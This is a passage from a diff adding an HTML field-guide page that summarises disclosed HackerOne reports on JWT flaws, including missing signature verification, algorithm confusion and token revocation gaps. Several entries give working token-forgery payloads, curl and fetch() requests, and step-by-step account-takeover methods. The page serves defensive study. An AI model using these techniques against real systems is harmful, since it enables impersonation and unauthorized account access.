+<h4>Method</h4><ol><li>Obtain any valid-looking JWT (or mint one at jwt.io)</li><li>Change the payload claim used for identity (here jti) to the target user id</li><li>Leave the signature arbitrary — it is never verified</li><li>Send it in Authorization: Bearer and be logged in as that user</li></ol>
+<div class="pre"># {"jti":1}
+curl -H "authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
+# -&gt; logged in as: 1
+# {"jti":2} same (invalid) signature
+curl -H "authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
+# -&gt; logged in as: 2  (signature never checked)</div>
+<p class="insight"><b>Insight —</b> Grep auth middleware for jwt.decode( (or jsonwebtoken decode, base64-decoding the payload manually) instead of jwt.verify(). If identity is taken from a decoded-but-unverified token, you can impersonate anyone by editing the payload. Test by mutating the payload while leaving the signature untouched — success proves no verification.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/748214" target="_blank" rel="noopener">hackerone.com/reports/748214</a></span><a class="src" href="#report-748214" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-736522" style="--sv:var(--sev-high)" data-sev="3" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Token reissue verifies only the refresh token, forging identity</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#736522</b> · nodejs-ecosystem · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Tag <b>jwt</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">On POST /token the code cryptographically verified only the refreshToken, then compared jwt.decode() (unverified) signatures between token and refreshToken; the target token's own signature was never validated, so a tampered token payload got re-signed into a valid new token, forging the user identity.</p>
+<h4>Method</h4><ol><li>Obtain a valid token + refreshToken pair</li><li>Modify the identity claim (e.g. payload 'u') inside the (unverified) token</li><li>POST to /token; server reissues a validly-signed token bearing the forged identity</li></ol>
+<div class="pre">// vulnerable check
+if (jwt.verify(refreshToken, key)) {
+  return jwt.decode(token,{complete:true}).signature === jwt.decode(refreshToken).signature;
+}
+// 'token' is never jwt.verify()'d -&gt; tamper its payload, keep signature field</div>
+<p class="insight"><b>Insight —</b> When two tokens are compared/reissued, BOTH must be cryptographically verified; comparing jwt.decode() output (which never checks the signature) is an auth bypass. Audit refresh/reissue endpoints for verify-vs-decode mistakes.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/736522" target="_blank" rel="noopener">hackerone.com/reports/736522</a></span><a class="src" href="#report-736522" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2122690" style="--sv:var(--sev-high)" data-sev="3" data-votes="42" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Deprovisioning bypass: Access JWT still valid after account disabled at IdP</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2122690</b> · cloudflare · awarded · 42 votes · resolved</div>
+<div class="taxo"><span>Program <b>cloudflare</b></span><span>Surface <b>web</b></span><span>Tag <b>jwt</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Zero Trust Access did not re-validate certain server-side conditions on each request, so a user disabled/deleted at the IdP who retained metadata of a prior Access JWT (plus a second active account in the same org) could keep reaching protected SaaS apps despite lacking privilege.</p>
+<h4>Method</h4><ol><li>Obtain/retain the Access JWT metadata while still a valid user.</li><li>Have (or gain) a second active account in the same organization.</li><li>After the primary account is disabled at the IdP, replay/reuse the retained JWT context; missing server-side revalidation lets access continue.</li></ol>
+<p class="insight"><b>Insight —</b> Test that a security event (account disable/delete, role removal, password reset) actually revokes existing tokens/sessions server-side. JWT-based systems often trust the token until expiry and skip re-checking current account state.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2122690" target="_blank" rel="noopener">hackerone.com/reports/2122690</a></span><a class="src" href="#report-2122690" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1103582" style="--sv:var(--sev-med)" data-sev="2" data-votes="210" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Integration JWT issued without checking the requesting user's role</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1103582</b> · security · awarded · 210 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Chain <b>low-priv JWT leak -&gt; link H1 to unowned Jira -&gt; privat</b></span><span>Tag <b>jwt</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The HackerOne-for-Jira app generated the integration claim JWT for any Jira user who visited the get-started servlet, without verifying they had admin/config privileges - so a Basic Jira user could obtain the JWT and link the (unowned) Jira instance to their own H1 account.</p>
+<h4>Method</h4><ol><li>On a Jira instance where the app is installed, use a Basic-role user</li><li>Visit {BaseUrl}/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira</li><li>Follow the 'click here' link to hackerone.com/apps/atlassian/claim-app?jwt=&lt;TOKEN&gt;</li><li>Use the leaked JWT to link the Jira instance to the attacker's H1 account, exposing private projects/issues</li></ol>
+<div class="pre">GET {BaseUrl}/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira
+-&gt; https://hackerone.com/apps/atlassian/claim-app?jwt=&lt;INTEGRATION_JWT&gt;</div>
+<p class="insight"><b>Insight —</b> Integration/setup endpoints that mint linking tokens (JWTs, install secrets) must enforce the same admin authorization as the config UI. Test low-privilege roles against 'get-started'/'connect'/'claim' servlets - the token issuance often lacks a role check even when the UI page is hidden.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1103582" target="_blank" rel="noopener">hackerone.com/reports/1103582</a></span><a class="src" href="#report-1103582" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2472798" style="--sv:var(--sev-med)" data-sev="2" data-votes="50" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Auth bypass via missing JWT signature verification (forge email claim)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2472798</b> · automattic · awarded · 50 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Tag <b>jwt</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Login/registration endpoint decodes the JWT payload but never verifies its signature. Any attacker-crafted (unsigned or wrong-key) token with an arbitrary email claim is trusted, authenticating as that user or creating arbitrary accounts.</p>
+<h4>Method</h4><ol><li>Craft a JWT whose payload contains email of the target account (sign with anything, or alg=none).</li><li>POST the token as text/plain to the auth endpoint (/wp-json/newspack-extended-access/v1/google/register).</li><li>Browser is now authenticated as the target user; or supply new details to register arbitrary accounts.</li></ol>
+<div class="pre">let url = `${location.origin}/wp-json/newspack-extended-access/v1/google/register`;
+let token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6InZpY3RpbUBleGFtcGxlLm9yZyJ9.anything";
+fetch(url,{method:'POST',headers:{'Content-type':'text/plain'},body:token});</div>
+<p class="insight"><b>Insight —</b> On any JWT/OIDC login, test whether the signature is actually checked: strip the signature, set alg=none, or re-sign with a random key, then flip the email/sub/uid claim. If it still authenticates, the server trusts decoded claims blindly.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2472798" target="_blank" rel="noopener">hackerone.com/reports/2472798</a></span><a class="src" href="#report-2472798" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1210502" style="--sv:var(--sev-med)" data-sev="2" data-votes="37" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>JWT algorithm confusion (RS256-&gt;HS256, public key as HMAC secret)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1210502</b> · 8x8-bounty · none · 37 votes · resolved</div>
+<div class="taxo"><span>Program <b>8x8-bounty</b></span><span>Surface <b>web</b></span><span>Tag <b>jwt</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A Prosody JWT module accepted symmetric algorithms even when asymmetric (RS256) verification was configured; setting alg to HS256 and signing with the known public key as the HMAC secret produced a token the server accepted.</p>
+<h4>Method</h4><ol><li>Obtain the instance's configured RSA public key</li><li>Forge a JWT with header alg=HS256 and the desired claims</li><li>HMAC-sign it using the public key bytes as the secret</li><li>Present the token to enter/start protected conference rooms</li></ol>
+<div class="pre"># header: {"alg":"HS256","typ":"JWT"}
+# sign(base64url(header)+'.'+base64url(payload), key=RSA_PUBLIC_KEY_PEM) using HMAC-SHA256</div>
+<p class="insight"><b>Insight —</b> When a verifier does not pin the algorithm to the key type, a public key (which is not secret) becomes a usable HMAC secret. Always test alg swapping RS256-&gt;HS256.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1210502" target="_blank" rel="noopener">hackerone.com/reports/1210502</a></span><a class="src" href="#report-1210502" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1593413" style="--sv:var(--sev-low)" data-sev="1" data-votes="16" data-bounty="250">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Excessive-lifetime, irrevocable Sign in with Apple JWT</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1593413</b> · cloudflare · USD 250 · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>cloudflare</b></span><span>Surface <b>web</b></span><span>Tag <b>jwt</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OIDC JWT issued on Sign in with Apple had a very long validity and no revocation, so an intercepted token grants impersonation across devices for its whole lifetime without re-auth.</p>
+<h4>Method</h4><ol><li>Capture the OIDC/SIWA JWT after login</li><li>Decode exp; confirm a long validity window</li><li>Replay the token from another device within that window -&gt; full access</li></ol>
+<p class="insight"><b>Insight —</b> Audit SSO/OIDC token exp and revocation: long-lived, non-revocable bearer JWTs turn a single interception into durable multi-device ATO.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1593413" target="_blank" rel="noopener">hackerone.com/reports/1593413</a></span><a class="src" href="#report-1593413" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">JWT labs</a> (hands-on practice).</li>
+<li>All 10 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#signature-validation-attacks">Signature &amp; validation attacks</a><a href="#no-signature-verification-decode-vs-verify" style="padding-left:24px">↳ No signature verification (decode vs verify)</a><a href="#alg-none" style="padding-left:24px">↳ alg:none</a><a href="#algorithm-confusion-rs256-hs256" style="padding-left:24px">↳ Algorithm confusion (RS256 → HS256)</a><a href="#weak-or-leaked-hmac-secret" style="padding-left:24px">↳ Weak or leaked HMAC secret</a><a href="#kid-jku-x5u-header-injection" style="padding-left:24px">↳ kid / jku / x5u header injection</a><a href="#claim-tampering-exp-aud-sub" style="padding-left:24px">↳ Claim tampering (exp / aud / sub)</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (10)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ PortSwigger: JWT</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
